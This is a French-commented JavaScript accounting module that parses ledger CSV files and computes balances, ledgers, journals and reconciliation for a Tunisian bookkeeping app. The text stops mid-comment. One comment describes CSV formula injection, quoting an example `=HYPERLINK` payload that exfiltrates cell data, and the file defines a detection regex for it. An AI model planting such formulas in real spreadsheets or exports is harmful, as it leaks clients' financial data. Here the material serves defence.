// Le moteur comptable, partagé par les DEUX applications (9.1.0, SPEC-FUNC-100).
//
// Pourquoi ce fichier existe. Depuis la 8.8.0, tout ce qui fait une comptabilité — grand livre,
// balance, livre-journal, centralisateur, lettrage — vit dans `core.js`, et `core.js` travaille sur
// `data` : les factures, les achats, les bulletins d'une entreprise. L'application du cabinet, elle,
// n'a pas de `data`. Elle a des LIGNES D'ÉCRITURE, lues dans les paquets que ses clients lui
// envoient. Les mêmes tableaux, à partir d'une matière différente.
//
// La règle qui décide du découpage, et qui ne doit pas bouger : **une fonction qui prend `data`
// reste dans core.js ; une fonction qui prend des LIGNES vit ici.** C'est ce qui rend ce module
// utile aux deux côtés — et c'est ce qui permet au test de parité d'exister : la balance que le
// cabinet calcule sur les lignes reçues doit être identique, au millime, à celle que l'entreprise
// calcule sur ses pièces. Deux chemins, un seul résultat ; sans ça, le comptable et son client
// n'auraient aucun moyen de savoir lequel des deux a raison.
//
// Ce fichier ne dépend de RIEN — pas même de core.js. C'est délibéré : il se charge AVANT lui dans
// les deux `index.html`, et un module qui appellerait core.js ne pourrait plus servir au cabinet,
// qui ne le charge pas. `round3` y est donc redéfini à l'identique plutôt qu'importé ; un test
// compare les deux corps caractère par caractère, parce que deux arrondis qui divergent d'un
// millime, c'est une balance qui ne tombe plus juste et personne qui sait pourquoi.
//
// Fonctionne dans le navigateur (window.SkanCompta) et dans Node (module.exports) pour les tests.
(function (root, factory) {
  if (typeof module === 'object' && module.exports) module.exports = factory();
  else root.SkanCompta = factory();
})(typeof self !== 'undefined' ? self : this, function () {

  // Le dinar tunisien compte trois décimales : un arrondi à deux centimes fabriquerait un écart de
  // balance sur la première facture venue. Corps IDENTIQUE à celui de core.js — un test l'exige.
  function round3(n) { return Math.round((Number(n) || 0) * 1000) / 1000; }

  // La clé d'une pièce comptable. Trois champs, toujours les mêmes, partout : c'est ce qui fait
  // qu'une pièce est UNE pièce, et que ses lignes s'équilibrent entre elles.
  const cleDePiece = e => `${e.journal || ''}|${e.piece || ''}|${e.date || ''}`;

  // ---------------------------------------------------------------- l'injection de formule CSV
  //
  // Un tableur ne lit pas un CSV comme un fichier de données : une cellule qui commence par `=`,
  // `+`, `-` ou `@` est une FORMULE, qu'il exécute à l'ouverture. Un libellé de facture ou un nom
  // de client passe dans nos exports tel quel — et nos exports, on les envoie au comptable. Écrire
  // `=HYPERLINK("http://…"&A1)` dans le libellé d'une ligne suffisait à faire partir le contenu de
  // sa balance vers une adresse choisie par celui qui a tapé le libellé, sans que rien ne plante et
  // sans qu'il voie autre chose qu'une cellule un peu bizarre. La parade est celle de tout le
  // monde : une apostrophe devant, que le tableur mange et qui force le texte.
  //
  // La tabulation et le retour chariot y sont aussi : certains tableurs les avalent et découvrent
  // le `=` derrière.
  //
  // Elle est volontairement STRICTE, et ne fait aucune exception pour ce qui ressemble à un
  // nombre : c'est à l'appelant de ne pas lui donner ses montants. Dans `core.toCsv`, les colonnes
  // `money` et `date` sortent par leur propre branche et ne la voient jamais — un `-12,500` reste
  // donc un montant. Et un numéro de téléphone `+216 71 123 456`, lui, DOIT être préfixé : c'est
  // du texte, et un tableur qui l'évalue le remplace par `#NOM?`. Une exception « ça ressemble à
  // un nombre » l'aurait perdu, parce qu'aucune règle ne distingue un téléphone d'un montant.
  //
  // Corps IDENTIQUE à celui recopié dans `src/cabinet/cabcore.js` (qui ne charge pas ce module) —
  // un test l'exige, comme pour `round3`.
  function csvDangereux(cellule) {
    return /^[=+\-@\t\r]/.test(cellule);
  }

  const txt = v => String(v == null ? '' : v).trim();
  const num = v => Number(v) || 0;

  // ---------------------------------------------------------------- la validité d'une écriture
  //
  // Sept motifs, dans l'ordre où ils se remarquent. Le premier est celui qu'on montre : empiler
  // sept phrases devant quelqu'un qui a fait UNE faute, c'est lui demander de les trier lui-même.
  // La liste entière reste disponible dans `motifs` pour l'écran qui veut tout dire.
  //
  // Ce que cette fonction NE fait pas : juger si un compte existe dans le plan. `plan` n'est là que
  // pour le dire quand on le lui donne — un plan de comptes est propre à chaque cabinet (6.3.0),
  // et refuser une écriture parce qu'un numéro n'est pas dans NOTRE liste serait imposer la nôtre.
  function ecritureValide(ecriture, plan) {
    const motifs = [];
    const e = ecriture || {};
    const lignes = (Array.isArray(e.lignes) ? e.lignes : [])
      .filter(l => l && (txt(l.compte) || num(l.debit) || num(l.credit)));

    if (!/^\d{4}-\d{2}-\d{2}$/.test(txt(e.date))) motifs.push('La date manque.');
    if (!txt(e.journal)) motifs.push('Le journal manque : c\'est lui qui range l\'écriture (ventes, achats, banque, OD).');
    if (lignes.length < 2) motifs.push('Une écriture a au moins deux lignes : un compte au débit, un compte au crédit.');

    lignes.forEach((l, i) => {
      const compte = txt(l.compte);
      const d = num(l.debit), c = num(l.credit);
      if (!compte) motifs.push(`Ligne ${i + 1} : le compte manque.`);
      else if (!/^\d{1,12}$/.test(compte)) motifs.push(`Ligne ${i + 1} : le compte doit être un numéro.`);
      else if (plan && plan.length && !plan.some(p => compte === String(p) || compte.startsWith(String(p)))) {
        motifs.push(`Ligne ${i + 1} : le compte ${compte} n'est pas dans le plan — à vérifier, ce n'est pas forcément une faute.`);
      }
      if (d < 0 || c < 0) motifs.push(`Ligne ${i + 1} : un montant négatif change de colonne, il ne garde pas son signe.`);
      if (d && c) motifs.push(`Ligne ${i + 1} : une ligne va au débit OU au crédit, pas les deux.`);
      if (!d && !c) motifs.push(`Ligne ${i + 1} : aucun montant.`);
    });

    const debit = round3(lignes.reduce((s, l) => s + num(l.debit), 0));
    const credit = round3(lignes.reduce((s, l) => s + num(l.credit), 0));
    if (lignes.length >= 2 && round3(debit - credit) !== 0) {
      motifs.push(`Débit ${debit.toFixed(3)} ≠ crédit ${credit.toFixed(3)} : l'écriture ne tombe pas juste.`);
    }
    return { ok: !motifs.length, motif: motifs[0] || '', motifs, debit, credit, lignes };
  }

  // ---------------------------------------------------------------- lire `journaux/ecritures.csv`
  //
  // Les colonnes s'associent par NOM, jamais par position (règle apprise en 6.8.0) : un client sous
  // une version plus ancienne de SkanFact n'a pas les mêmes colonnes ni le même ordre, et aligner à
  // l'aveugle met des montants dans « Tiers » sans que rien ne plante.
  //
  // Le lecteur est un vrai lecteur de CSV : un libellé de facture contient un point-virgule un jour
  // sur dix, et c'est ce jour-là que le fichier d'un cabinet part de travers.
  const ENTETES = {
    'n°': 'numero', 'n0': 'numero', 'no': 'numero', 'numero': 'numero', 'numéro': 'numero',
    'date': 'date',
    'journal': 'journal', 'jnl': 'journal', 'code journal': 'journal',
    'pièce': 'piece', 'piece': 'piece', 'n° pièce': 'piece', 'reference': 'piece', 'référence': 'piece',
    'compte': 'account', 'n° compte': 'account', 'compte général': 'account',
    'tiers': 'tiers', 'auxiliaire': 'tiers', 'compte tiers': 'tiers',
    'libellé': 'label', 'libelle': 'label', 'intitulé': 'label', 'intitule': 'label',
    'débit': 'debit', 'debit': 'debit',
    'crédit': 'credit', 'credit': 'credit',
    'lettrage': 'lettre', 'lettre': 'lettre',
    'devise': 'currency', 'monnaie': 'currency'
  };

  // Un montant tel qu'un tableur l'écrit. Trois écritures possibles pour le même nombre, et la
  // seule façon de ne pas se tromper est de regarder QUEL séparateur vient en dernier : dans
  // « 1.234,567 » c'est la virgule qui décide, dans « 1,234.567 » c'est le point.
  function nombreDepuisCsv(v) {
    let s = String(v == null ? '' : v).replace(/\s| | /g, '').replace(/[^\d.,+-]/g, '');
    if (!s) return 0;
    const dVirgule = s.lastIndexOf(','), dPoint = s.lastIndexOf('.');
    if (dVirgule >= 0 && dPoint >= 0) {
      s = dVirgule > dPoint ? s.replace(/\./g, '').replace(',', '.') : s.replace(/,/g, '');
    } else if (dVirgule >= 0) {
      // Une seule virgule : décimale (« 1234,567 »). Plusieurs : séparateur de milliers.
      s = s.split(',').length === 2 ? s.replace(',', '.') : s.replace(/,/g, '');
    }
    const n = Number(s);
    return isFinite(n) ? n : 0;
  }

  // Une date telle qu'un CSV la porte. `toCsv` écrit `JJ/MM/AAAA` (c'est ce qu'un tableur français
  // attend), et la RELIRE telle quelle donnait des mois « 01/01/2 » : le centralisateur groupait
  // par les six premiers caractères, le grand livre triait des chaînes qui ne se comparent pas, et
  // rien ne plantait. Un aller-retour qui ne revient pas est le pire des deux mondes — on ramène
  // donc toujours au jour de calendrier `AAAA-MM-JJ`.
  //
  // Aucun objet Date ici : une date de l'app est un JOUR, pas un instant (règle 5.2.3). Trois
  // découpages de chaîne, et la machine de test à Tunis comme à Londres rend la même chose.
  function dateDepuisCsv(v) {
    const s = txt(v);
    if (/^\d{4}-\d{2}-\d{2}$/.test(s)) return s;
    let m = s.match(/^(\d{1,2})[/.-](\d{1,2})[/.-](\d{4})$/);           // 10/03/2026
    if (m) return `${m[3]}-${String(m[2]).padStart(2, '0')}-${String(m[1]).padStart(2, '0')}`;
    m = s.match(/^(\d{4})[/.](\d{1,2})[/.](\d{1,2})$/);                  // 2026/03/10
    if (m) return `${m[1]}-${String(m[2]).padStart(2, '0')}-${String(m[3]).padStart(2, '0')}`;
    return s;   // ce qu'on ne sait pas lire reste tel quel : l'écran le montrera, on ne l'invente pas
  }

  // Le découpage, caractère par caractère : guillemets doublés, séparateur à l'intérieur d'un champ
  // entre guillemets, fins de ligne Windows. Le BOM que les tableurs posent en tête est retiré —
  // sans ça, la PREMIÈRE colonne ne s'associe jamais, et c'est justement « N° » ou « Date ».
  function lignesCsv(texte, sep) {
    const s = String(texte || '').replace(/^﻿/, '');
    const rows = [];
    let ligne = [], champ = '', i = 0, guill = false;
    while (i < s.length) {
      const c = s[i];
      if (guill) {
        if (c === '"') {
          if (s[i + 1] === '"') { champ += '"'; i += 2; continue; }
          guill = false; i++; continue;
        }
        champ += c; i++; continue;
      }
      if (c === '"') { guill = true; i++; continue; }
      if (c === sep) { ligne.push(champ); champ = ''; i++; continue; }
      if (c === '\r') { i++; continue; }
      if (c === '\n') { ligne.push(champ); rows.push(ligne); ligne = []; champ = ''; i++; continue; }
      champ += c; i++;
    }
    if (champ !== '' || ligne.length) { ligne.push(champ); rows.push(ligne); }
    return rows.filter(r => r.length > 1 || txt(r[0]) !== '');
  }

  function entreesDepuisCsv(texte) {
    const brut = String(texte || '').replace(/^﻿/, '');
    const tete = (brut.split(/\r?\n/)[0] || '');
    // Le séparateur se DÉDUIT de l'entête : celui qu'on y voit le plus. Un fichier exporté d'un
    // tableur anglophone arrive en tabulations, et le refuser n'apprendrait rien à personne.
    const sep = [';', '\t', ','].map(c => [c, tete.split(c).length]).sort((a, b) => b[1] - a[1])[0][0];
    const rows = lignesCsv(brut, sep);
    const out = [];
    out.ignorees = 0; out.colonnes = {}; out.sep = sep;
    if (!rows.length) { out.entete = false; return out; }

    const entete = rows[0].map(c => txt(c).toLowerCase());
    const map = {};
    entete.forEach((nom, i) => { if (ENTETES[nom] && map[ENTETES[nom]] == null) map[ENTETES[nom]] = i; });
    out.colonnes = map;
    // Sans colonne « Compte », ce n'est pas un fichier d'écritures. On le dit au lieu de rendre
    // deux cents lignes vides : un import qui réussit sur rien est pire qu'un import qui refuse.
    out.entete = map.account != null;
    if (!out.entete) return out;

    for (let r = 1; r < rows.length; r++) {
      const c = rows[r];
      const at = k => (map[k] == null ? '' : txt(c[map[k]]));
      const account = at('account');
      if (!account) { out.ignorees++; continue; }
      out.push({
        numero: Number(at('numero')) || 0,
        date: dateDepuisCsv(at('date')), journal: at('journal'), piece: at('piece'),
        account, tiers: at('tiers'), label: at('label'),
        debit: round3(map.debit == null ? 0 : nombreDepuisCsv(c[map.debit])),
        credit: round3(map.credit == null ? 0 : nombreDepuisCsv(c[map.credit])),
        lettre: at('lettre'), currency: at('currency')
      });
    }
    return out;
  }

  // ---------------------------------------------------------------- l'équilibre
  //
  // Déplacé de core.js (6.3.0), corps identique : ce qui est garanti d'une comptabilité, ce n'est
  // aucun numéro de compte — c'est que débit = crédit sur CHAQUE pièce, pas seulement au total. Un
  // total équilibré peut cacher deux pièces fausses qui se compensent.
  function entriesBalance(entries) {
    const byPiece = {};
    entries.forEach(e => {
      const k = `${e.journal}|${e.piece}|${e.date}`;
      byPiece[k] = byPiece[k] || { key: k, journal: e.journal, piece: e.piece, date: e.date, debit: 0, credit: 0 };
      byPiece[k].debit = round3(byPiece[k].debit + e.debit);
      byPiece[k].credit = round3(byPiece[k].credit + e.credit);
    });
    const pieces = Object.keys(byPiece).map(k => byPiece[k]);
    const off = pieces.filter(p => round3(p.debit - p.credit) !== 0);
    const debit = round3(entries.reduce((s, e) => s + e.debit, 0));
    const credit = round3(entries.reduce((s, e) => s + e.credit, 0));
    return { debit, credit, balanced: round3(debit - credit) === 0 && !off.length, pieces: pieces.length, off, lines: entries.length };
  }

  // La balance par compte : ce que le comptable regarde pour voir si un compte a été oublié.
  function entriesByAccount(entries) {
    const by = {};
    entries.forEach(e => {
      by[e.account] = by[e.account] || { account: e.account, debit: 0, credit: 0, lines: 0 };
      by[e.account].debit = round3(by[e.account].debit + e.debit);
      by[e.account].credit = round3(by[e.account].credit + e.credit);
      by[e.account].lines++;
    });
    return Object.keys(by).sort().map(k => ({ ...by[k], solde: round3(by[k].debit - by[k].credit) }));
  }

  // Un solde d'ouverture arrive sous deux formes selon d'où il vient : `soldesOuverture` (core.js)
  // rend un nombre SIGNÉ par compte, un fichier de reprise rend { debit, credit }. On accepte les
  // deux plutôt que d'obliger chaque appelant à convertir — c'est la conversion oubliée quelque
  // part qui fabrique une balance fausse.
  function ouvertureDe(ouverture, compte) {
    const v = ouverture && ouverture[compte];
    if (v == null) return 0;
    if (typeof v === 'object') return round3(num(v.debit) - num(v.credit));
    return round3(num(v));
  }

  // ---------------------------------------------------------------- la balance
  //
  // `libelle(compte, tiers)` est facultatif : un intitulé de compte dépend du plan de celui qui
  // regarde, et ce module ne connaît aucun plan. Sans lui, les lignes portent leur `tiers` et
  // l'appelant nomme ce qu'il veut.
  //
  // Ce qui est GARANTI, et testé : les trois paires de totaux tombent juste (ouverture, mouvements,
  // soldes). Ce n'est pas la même chose que « la balance est juste » — une balance dont les ventes
  // reportaient l'année précédente tomberait juste aussi. C'est la seule chose qu'on affirme.
  function balanceDepuisLignes(entries, ouverture, libelle) {
    const by = {};
    const row = k => (by[k] = by[k] || { account: k, ouverture: 0, debit: 0, credit: 0, lignes: 0, tiers: '' });
    Object.keys(ouverture || {}).forEach(k => { row(k).ouverture = ouvertureDe(ouverture, k); });
    (entries || []).forEach(e => {
      const r = row(e.account);
      r.debit = round3(r.debit + num(e.debit));
      r.credit = round3(r.credit + num(e.credit));
      r.lignes++;
      if (e.tiers && !r.tiers) r.tiers = e.tiers;
    });
    const rows = Object.keys(by).sort().map(k => {
      const r = by[k];
      const solde = round3(r.ouverture + r.debit - r.credit);
      return {
        ...r,
        label: libelle ? libelle(k, r.tiers) : '',
        classe: String(k).slice(0, 1),
        ouvertureD: r.ouverture > 0 ? r.ouverture : 0,
        ouvertureC: r.ouverture < 0 ? round3(-r.ouverture) : 0,
        solde, soldeD: solde > 0 ? solde : 0, soldeC: solde < 0 ? round3(-solde) : 0
      };
    });
    const sum = f => round3(rows.reduce((s, r) => s + f(r), 0));
    const totaux = {
      ouvertureD: sum(r => r.ouvertureD), ouvertureC: sum(r => r.ouvertureC),
      debit: sum(r => r.debit), credit: sum(r => r.credit),
      soldeD: sum(r => r.soldeD), soldeC: sum(r => r.soldeC)
    };
    const ok = round3(totaux.ouvertureD - totaux.ouvertureC) === 0
      && round3(totaux.debit - totaux.credit) === 0
      && round3(totaux.soldeD - totaux.soldeC) === 0;
    return { rows, totaux, ok, equilibree: ok };
  }

  // ---------------------------------------------------------------- le grand livre
  //
  // `compte` est un numéro ou un PRÉFIXE : « 4 » donne tous les tiers, « 411 » les clients. Les
  // lignes sont triées date puis pièce, et le solde avance ligne par ligne jusqu'au total — c'est
  // cette dernière égalité qui fait qu'un grand livre se lit : la dernière valeur de la colonne
  // « solde » EST le solde du compte dans la balance. Un test le vérifie compte par compte.
  function grandLivreDepuisLignes(entries, compte, ouverture, libelle) {
    const filtre = txt(compte);
    const comptes = {};
    const get = k => (comptes[k] = comptes[k] || { account: k, ouverture: ouvertureDe(ouverture, k), lignes: [], debit: 0, credit: 0, tiers: '' });
    Object.keys(ouverture || {}).forEach(k => { if (!filtre || String(k).startsWith(filtre)) get(k); });
    (entries || []).forEach(e => {
      const a = txt(e.account);
      if (filtre && !a.startsWith(filtre)) return;
      const c = get(a);
      c.lignes.push(e);
      if (e.tiers && !c.tiers) c.tiers = e.tiers;
    });
    const out = Object.keys(comptes).sort().map(k => {
      const c = comptes[k];
      let solde = c.ouverture;
      c.lignes.sort((a, b) => txt(a.date).localeCompare(txt(b.date))
        || (num(a.numero) - num(b.numero))
        || txt(a.journal).localeCompare(txt(b.journal))
        || txt(a.piece).localeCompare(txt(b.piece), undefined, { numeric: true }));
      c.lignes = c.lignes.map(e => {
        solde = round3(solde + num(e.debit) - num(e.credit));
        c.debit = round3(c.debit + num(e.debit));
        c.credit = round3(c.credit + num(e.credit));
        return { ...e, solde };
      });
      return { ...c, label: libelle ? libelle(k, c.tiers) : '', classe: String(k).slice(0, 1), solde };
    });
    return {
      comptes: out,
      debit: round3(out.reduce((s, c) => s + c.debit, 0)),
      credit: round3(out.reduce((s, c) => s + c.credit, 0)),
      lignes: out.reduce((s, c) => s + c.lignes.length, 0)
    };
  }

  // ---------------------------------------------------------------- le livre-journal
  //
  // Une pièce par (date, journal, numéro de pièce), numérotée 1..n dans l'ordre (date, pièce). Le
  // numéro est DÉDUIT, donc mobile tant que la période est ouverte : une pièce datée en arrière
  // décale les suivantes. Ce n'est pas un défaut à corriger, c'est la raison d'être de la clôture —
  // et c'est écrit à l'écran, sinon un comptable qui voit deux numéros différents pour la même
  // pièce à deux jours d'intervalle appelle.
  function journalDepuisLignes(entries) {
    const by = {};
    const ordre = [];
    (entries || []).forEach(e => {
      const k = cleDePiece(e);
      if (!by[k]) {
        by[k] = { key: k, date: txt(e.date), journal: txt(e.journal), piece: txt(e.piece), lignes: [], debit: 0, credit: 0 };
        ordre.push(k);
      }
      const p = by[k];
      p.lignes.push(e);
      p.debit = round3(p.debit + num(e.debit));
      p.credit = round3(p.credit + num(e.credit));
    });
    const pieces = ordre.map(k => by[k])
      .sort((a, b) => a.date.localeCompare(b.date)
        || a.piece.localeCompare(b.piece, undefined, { numeric: true })
        || a.journal.localeCompare(b.journal))
      .map((p, i) => ({ ...p, numero: i + 1, equilibree: round3(p.debit - p.credit) === 0 }));
    return {
      pieces,
      debit: round3(pieces.reduce((s, p) => s + p.debit, 0)),
      credit: round3(pieces.reduce((s, p) => s + p.credit, 0)),
      lignes: (entries || []).length,
      off: pieces.filter(p => !p.equilibree)
    };
  }

  // Le centralisateur : mois par mois, journal par journal. C'est le récapitulatif que le
  // livre-journal coté et paraphé reprend, et la première chose qu'un comptable regarde pour voir
  // si un mois est vide alors qu'il ne devrait pas l'être.
  function centralisateurDepuisLignes(entries) {
    const by = {};
    const vues = {};
    (entries || []).forEach(e => {
      const mois = txt(e.date).slice(0, 7);
      const journal = txt(e.journal);
      const k = `${mois}|${journal}`;
      by[k] = by[k] || { mois, journal, debit: 0, credit: 0, pieces: 0 };
      by[k].debit = round3(by[k].debit + num(e.debit));
      by[k].credit = round3(by[k].credit + num(e.credit));
      const p = k + '|' + txt(e.piece);
      if (!vues[p]) { vues[p] = true; by[k].pieces++; }
    });
    return Object.keys(by).sort().map(k => by[k]);
  }

  // ---------------------------------------------------------------- le lettrage
  //
  // Rapprocher chaque règlement de sa facture, tiers par tiers. Ce n'est pas une saisie : c'est une
  // LECTURE. Ce qui porte une lettre est soldé, ce qui n'en porte pas est listé avec son reste.
  //
  // Le contrôle qui compte — et qu'aucun équilibre ne remplace : **le reste ouvert doit être le
  // solde du compte**. C'est lui qui a trouvé, en 8.9.0, une facture couverte par un avoir dont
  // l'écriture sautait pendant que celle de l'avoir restait : la balance tombait juste (une pièce
  // équilibrée en moins reste équilibrée) et le client finissait créditeur sans raison.
  function lettrageDepuisLignes(entries, compteOuRole, todayIso) {
    const role = compteOuRole === 'clients' || compteOuRole === 'fournisseurs' ? compteOuRole : '';
    const prefixe = role ? '' : txt(compteOuRole);
    const t = txt(todayIso);
    const dans = e => {
      if (role) return e.role === role;
      return !prefixe || txt(e.account).startsWith(prefixe);
    };
    const by = {};
    const tiersDe = e => {
      const k = e.tiersId || ('~' + txt(e.tiers));
      return by[k] = by[k] || {
        tiersId: e.tiersId || '', tiers: txt(e.tiers) || '(sans tiers)',
        account: txt(e.account), lettrees: 0, ouverts: [], reste: 0, solde: 0
      };
    };
    const pieces = {};
    (entries || []).filter(dans).forEach(e => {
      const r = tiersDe(e);
      r.solde = round3(r.solde + num(e.debit) - num(e.credit));
      const k = `${r.tiersId || r.tiers}|${txt(e.lettre)}|${txt(e.piece)}`;
      if (!pieces[k]) {
        pieces[k] = { r, lettre: txt(e.lettre), piece: txt(e.piece), date: txt(e.date), echeance: txt(e.echeance), debit: 0, credit: 0 };
      }
      pieces[k].debit = round3(pieces[k].debit + num(e.debit));
      pieces[k].credit = round3(pieces[k].credit + num(e.credit));
      if (txt(e.date) < pieces[k].date || !pieces[k].date) pieces[k].date = txt(e.date);
    });
    // Un lettrage dont les pièces ne se soldent PAS entre elles est une faute de saisie : 100 de
    // facture lettrés contre 60 de règlement. Sans ce contrôle, l'écart apparaîtrait seulement
    // dans `concorde` — donc sous la phrase « le reste ouvert n'est pas le solde du compte », qui
    // est vraie mais n'apprend rien. On le NOMME, avec sa lettre et son écart.
    const parLettre = {};
    Object.keys(pieces).forEach(k => {
      const p = pieces[k];
      if (!p.lettre) return;
      const c = `${p.r.tiersId || p.r.tiers}|${p.lettre}`;
      parLettre[c] = parLettre[c] || { tiers: p.r.tiers, lettre: p.lettre, debit: 0, credit: 0, pieces: 0 };
      parLettre[c].debit = round3(parLettre[c].debit + p.debit);
      parLettre[c].credit = round3(parLettre[c].credit + p.credit);
      parLettre[c].pieces++;
    });
    const lettragesFaux = Object.keys(parLettre).map(k => parLettre[k])
      .map(l => ({ ...l, ecart: round3(l.debit - l.credit) }))
      .filter(l => l.ecart !== 0);

    Object.keys(pieces).forEach(k => {
      const p = pieces[k];
      const reste = round3(p.debit - p.credit);
      // Une pièce lettrée, ou qui se solde d'elle-même, sort de la liste des ouverts : elle est
      // réglée, et la montrer noyerait ce qui reste vraiment à réclamer.
      if (p.lettre || reste === 0) { p.r.lettrees++; return; }
      p.r.ouverts.push({
        piece: p.piece || '(sans numéro)', date: p.date, echeance: p.echeance,
        montant: round3(Math.abs(p.debit || p.credit)), debit: p.debit, credit: p.credit,
        reste, retard: !!(p.echeance && t && p.echeance < t)
      });
      p.r.reste = round3(p.r.reste + reste);
    });
    const rows = Object.keys(by).map(k => by[k])
      .filter(r => r.lettrees || r.ouverts.length)
      .map(r => ({ ...r, ouverts: r.ouverts.sort((a, b) => txt(a.date).localeCompare(txt(b.date))) }))
      .sort((a, b) => Math.abs(b.reste) - Math.abs(a.reste) || a.tiers.localeCompare(b.tiers));
    const resteOuvert = round3(rows.reduce((s, r) => s + r.reste, 0));
    const soldeCompte = round3(rows.reduce((s, r) => s + r.solde, 0));
    return {
      role: role || prefixe, rows, resteOuvert, soldeCompte, lettragesFaux,
      // Le contrôle, rendu explicite : l'écran doit pouvoir le DIRE, pas seulement le calculer.
      concorde: round3(resteOuvert - soldeCompte) === 0,
      ecart: round3(resteOuvert - soldeCompte),
      ouverts: rows.reduce((s, r) => s + r.ouverts.length, 0),
      lettrees: rows.reduce((s, r) => s + r.lettrees, 0)
    };
  }

  // ================================================================ LE LIVRE (9.2.0)
  //
  // `livre.json` : un fichier par dossier ET par exercice, côté cabinet. Tout ce qui suit est PUR —
  // la forme du livre, ses invariants et les six gestes qui l'écrivent se testent sans Electron,
  // sans disque et sans clé. `cabstore` ne fait que poser le résultat sur le disque, chiffré.
  //
  // Les trois règles qui décident de tout le reste, et qui ne bougent plus :
  //
  //   1. **Une écriture VALIDÉE ne se modifie jamais.** Ni ses lignes, ni sa date, ni son journal.
  //      On la contre-passe : une écriture miroir, datée du jour où l'on corrige. C'est ce qui fait
  //      qu'un livre se relit deux ans plus tard et dit la vérité de ce qui a été fait — une
  //      comptabilité qu'on peut réécrire n'est pas une comptabilité.
  //   2. **Le numéro s'attribue à la VALIDATION, jamais au brouillard**, et par ordre de
  //      validation, pas par date. C'est la différence avec la numérotation déduite de la 8.9.0 :
  //      là-bas un numéro bougeait quand on insérait une pièce en arrière (et la page le disait) ;
  //      ici il est écrit, et il ne bouge plus jamais.
  //   3. **Le paquet du client ne gagne jamais contre le cabinet.** Un mois renvoyé remplace les
  //      brouillards et ne touche AUCUNE validée : on calcule l'écart, on l'affiche, et c'est le
  //      comptable qui tranche. L'inverse — écraser son travail parce que le client a rouvert son
  //      mois — serait la pire chose que ce logiciel puisse faire.

  const LIVRE_FORMAT = 1;
  const STATUTS_ECRITURE = ['brouillard', 'validee', 'contrepassee'];
  const NATURES_COMPTE = ['bilan', 'gestion', 'tiers', 'tresorerie'];
  const SOURCES_ECRITURE = ['skanfact', 'saisie', 'banque', 'inventaire', 'an', 'import', 'od'];

  // Les journaux d'un dossier neuf. Le comptable les modifie ; ce ne sont que des propositions.
  const JOURNAUX_PAR_DEFAUT = [
    { code: 'VT', libelle: 'Ventes', type: 'ventes' },
    { code: 'AC', libelle: 'Achats', type: 'achats' },
    { code: 'BQ', libelle: 'Banque', type: 'tresorerie', compte: '532' },
    { code: 'CA', libelle: 'Caisse', type: 'tresorerie', compte: '54' },
    { code: 'PAIE', libelle: 'Paie', type: 'paie' },
    { code: 'OD', libelle: 'Opérations diverses', type: 'od' },
    { code: 'AN', libelle: 'À-nouveaux', type: 'an' }
  ];

  // La nature d'un compte DÉDUITE de son numéro, quand le CSV importé ne la donne pas. Aucun de ces
  // rangements n'est une vérité — chaque cabinet a les siens — mais deviner vaut mieux que laisser
  // vide : une nature vide casserait la balance par classe, et personne ne saurait pourquoi.
  function natureDeCompte(compte) {
    const n = String(compte || '').trim();
    if (!/^\d/.test(n)) return '';
    if (/^(411|401|40|41|42|43|44|45|46)/.test(n)) return 'tiers';
    if (/^(53|54|58|50)/.test(n)) return 'tresorerie';
    if (/^[67]/.test(n)) return 'gestion';
    if (/^[1-5]/.test(n)) return 'bilan';
    return '';
  }

  // Un identifiant d'écriture. Pas de `Date.now()` ni de `Math.random()` imposés : l'appelant donne
  // la graine, parce que ce module doit rester reproductible (règle des workflows, et surtout :
  // un test qui dépend de l'horloge ne prouve rien).
  let compteurId = 0;
  function idEcriture(graine) {
    compteurId = (compteurId + 1) % 1000000;
    return 'e_' + String(graine || 0).toString(36) + '_' + compteurId.toString(36);
  }

  function livreVide(dossierId, annee, opts) {
    const o = opts || {};
    const a = Number(annee) || 0;
    return {
      format: LIVRE_FORMAT,
      dossier: String(dossierId || ''),
      exercice: {
        annee: a,
        du: o.du || `${a}-01-01`,
        au: o.au || `${a}-12-31`,
        clos: false, closLe: null, closPar: null, reouvertures: []
      },
      plan: Array.isArray(o.plan) ? o.plan.slice() : [],
      journaux: Array.isArray(o.journaux) ? o.journaux.slice() : JOURNAUX_PAR_DEFAUT.map(j => ({ ...j })),
      ecritures: [],
      lettrages: [],
      // Trois listes VIDES dont la forme est figée dès maintenant (SPEC-DATA-005). Elles ne se
      // remplissent qu'en 9.5.0, 9.6.0 et 9.7.0 — mais un relevé « par ligne » ne se transforme pas
      // en relevé « par compte » une fois écrit chez soixante clients.
      releves: [], immobilisations: [], declarations: [],
      ouverture: { date: null, source: null, lignes: [] },
      audit: []
    };
  }

  // Ce qu'on relit du disque avant d'y toucher. Un `false` ici veut dire « ce fichier n'est pas un
  // livre » : on le met de côté sans jamais l'écraser (même règle que `skanfact-data.json`).
  //
  // Une version SUPÉRIEURE est refusée à part (`versionInconnue`) : ouvrir un livre écrit par une
  // version plus récente et le réécrire avec nos règles à nous perdrait ce qu'elle y avait mis.
  function isValidLivre(obj) {
    if (!obj || typeof obj !== 'object') return false;
    if (obj.format !== LIVRE_FORMAT) return false;
    if (typeof obj.dossier !== 'string') return false;
    if (!obj.exercice || typeof obj.exercice !== 'object') return false;
    if (!/^\d{4}-\d{2}-\d{2}$/.test(String(obj.exercice.du))) return false;
    if (!/^\d{4}-\d{2}-\d{2}$/.test(String(obj.exercice.au))) return false;
    if (String(obj.exercice.du) > String(obj.exercice.au)) return false;
    const listes = ['plan', 'journaux', 'ecritures', 'lettrages', 'releves', 'immobilisations', 'declarations', 'audit'];
    if (listes.some(k => !Array.isArray(obj[k]))) return false;
    return obj.ecritures.every(e => e && typeof e === 'object'
      && STATUTS_ECRITURE.includes(e.statut) && Array.isArray(e.lignes));
  }
  const livreVersionInconnue = obj => !!(obj && typeof obj === 'object'
    && typeof obj.format === 'number' && obj.format > LIVRE_FORMAT);

  const trace = (livre, qui, quoi, detail, quand) =>
    livre.audit.push({ quand: Number(quand) || 0, qui: String(qui || ''), quoi, detail: detail || '' });

  // Le plan reçoit un compte qu'il n'a pas. JAMAIS un refus silencieux : une ligne qui référence un
  // compte absent doit entrer, avec son compte marqué `import`, sinon l'écriture disparaîtrait et
  // la balance serait fausse sans que rien ne le dise (invariant 2 de SPEC-DATA-005).
  function assurerCompte(livre, compte, libelle) {
    const n = String(compte || '').trim();
    if (!n) return null;
    let c = livre.plan.find(x => x.compte === n);
    if (c) return c;
    c = { compte: n, libelle: libelle || 'Compte hors plan', nature: natureDeCompte(n), source: 'import' };
    livre.plan.push(c);
    return c;
  }

  // Ajouter une écriture : TOUJOURS en brouillard, TOUJOURS sans numéro. Il n'existe aucun chemin
